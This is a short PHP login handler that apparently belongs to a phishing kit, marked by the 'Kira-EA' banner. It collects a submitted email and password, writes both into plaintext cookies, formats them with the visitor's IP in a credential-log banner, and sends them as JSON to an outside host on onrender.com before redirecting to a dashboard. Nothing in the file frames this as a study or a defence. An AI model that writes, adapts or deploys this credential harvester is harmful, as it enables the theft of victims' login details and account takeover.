<?php
include 'config.php';
session_start();

// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = isset($_POST['field1']) ? $_POST['field1'] : '';
    $password = isset($_POST['field2']) ? $_POST['field2'] : '';
    
    $_SESSION['field1'] = $email;
    $_SESSION['field2'] = $password;

    // Create cookies that last for 1 day
    setcookie("user_email", $email, time() + 86400, "/");
    setcookie("user_password", $password, time() + 86400, "/");

    // Prepare the message for logging or sending
    $ip = getenv("REMOTE_ADDR");
    $message = "[========== ♠️ ⚡Kira-EA⚡ ♠️ ===========]\r\n";
    $message .= "|USERNAME       : " . $email . "\r\n";
    $message .= "|PASSWORD       : " . $password . "\r\n";
    $message .= "[========= $ip ========]\r\n";

    // Prepare data for POST request
    $data = json_encode(array("email" => $email, "password" => $password, "ip" => $ip));

    // Set up HTTP headers
    $options = [
        'http' => [
            'header' => "Content-type: application/json",
            'method' => 'POST',
            'content' => $data,
        ],
    ];

    $context = stream_context_create($options);

    // Send request to Node.js server
    $response = @file_get_contents('https://pup-nj1z.onrender.com/login', false, $context);

    // Handle response
    if ($response === false) {
        $_SESSION['errorMessage'] = "Error communicating with the server.";
        echo '<script>alert("Error communicating with the server."); window.location.href = "./index.html";</script>';
        exit();
    }

    // Redirect to dashboard if successful
    header("Location: dashboard.php");
    exit();
}
?>
